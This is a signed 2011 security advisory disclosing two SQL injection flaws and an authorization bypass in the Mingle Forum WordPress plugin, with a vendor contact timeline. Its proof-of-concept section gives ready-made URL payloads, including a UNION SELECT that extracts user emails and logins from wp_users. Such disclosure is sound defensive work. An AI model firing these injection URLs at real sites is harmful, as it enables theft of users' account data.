@@ -1,0 +1,95 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+
+1. Advisory Information
+
+Title: Multiple Vulnerabilities in Mingle Forum (WordPress Plugin)
+Advisory URL: http://www.charleshooper.net/advisories/
+Date Published: January 8th, 2011
+Vendors Contacted: Paul Carter - Maintainer of plugin.
+
+
+2. Summary
+
+Mingle Forum is a plugin for the popular blog tool and publishing
+platform, WordPress. According to the author of Mingle Forum, "Mingle
+Forum has been modified to be lightweight, solid, secure, quick to
+setup, [and] easy to use."
+
+There exist multiple vulnerabilities in Mingle Forum, SQL injection
+being among them.
+
+
+3. Vulnerability Information
+
+Packages/Versions Affected: Confirmed on 1.0.24 and 1.0.26
+
+3a. Type:       SQL Injection [CWE-89]
+3a. Impact:     Read application data.
+3a. Discussion: There is a SQL injection vulnerability present in the
+RSS feed generator. By crafting specific URLs an attacker can retrieve
+information from the MySQL database.
+
+3b. Type:       SQL Injection [CWE-89]
+3b. Impact:     Read application data.
+3b. Discussion: There is a SQL injection vulnerability present in the
+`edit post` functionality. By crafting specific URLs an attacker can
+retrieve information from the MySQL database.
+
+3c. Type:       Auth Bypass via Direct Request [CWE-425]
+3c. Impact:     AuthZ is not performed for `edit post` functionality.
+3c. Discussion: By browsing directly to the `edit post` page a user can
+view and edit any page.
+
+
+4. PoC & Technical Description
+
+4a.
+http://path.to/wordpress/wp-content/plugins/mingle-forum/feed.php?topic=0%20UNION%20SELECT%201,user_email,3,4,5,user_login,7%20FROM%20wp_users%20%23
+
+4b.
+http://path.to/forums/?mingleforumaction=editpost&t=1.0&id=0%20UNION%20SELECT%201,2,3,4,5,6,7%20%23
+
+4c. http://path.to/forums/?mingleforumaction=editpost&t=1.0&id=<target
+post ID>
+
+
+5. Report Timeline
+
+12/17/2010 Initial email sent to plugin maintainer.
+12/22/2010 Confirmation of first email requested.
+12/31/2010 Correct email address obtained. Maintainer contacted again on
+this date.
+01/01/2010 Received response from plugin maintainer.
+01/07/2010 Plugin maintainer releases update that addresses these
+vulnerabilities.
+
+6. References
+
+6a. The WordPress Plugin page for Mingle Forum:
+    http://wordpress.org/extend/plugins/mingle-forum/
+
+
+7. Legalese
+
+This vulnerability report by Charles Hooper < chooper () plumata com > is
+licensed under a Creative Commons Attribution-NonCommercial-ShareAlike
+3.0 Unported License.
+
+
+8. Signature
+
+Public Key: Obtainable via pool.sks-keyservers.net
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.7 (MingW32)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
+
+iQEVAwUBTSiA5BjF72tr3DinAQJxawf8CtPQBDcHJFaS2qzPixcqVojNz7Bo2toK
+h96ye1Fkrt+FsyyuRXCBUTCTImtkj8pkmLqDErxzWFWZinzBTESjOtDZ7W5ztr1M
+lkFcaa8Rax13iuLPsU/GKKtSn4A8Df2AxJ2wnCd4cyfu4pZNsx4M/RG/XYcYZGj9
+GmJiOFau0BKbLoHwCW5o4spg6Ljnpw30ablznbfuaqz/ec9MCPdtDQPAh6/WpVk0
+TyjHmr+kZsv5CpC0TBPKSQzKD2ZcRCdNIB0f/dQ04cl5bxXK2ORChePll2F6hpQZ
+yMsPj3bOfMlu2Vukq4xorxsXpWSAGcOrTe2kdSM5/cvgcd2r8VNTQQ==
+=jLFM
+-----END PGP SIGNATURE-----
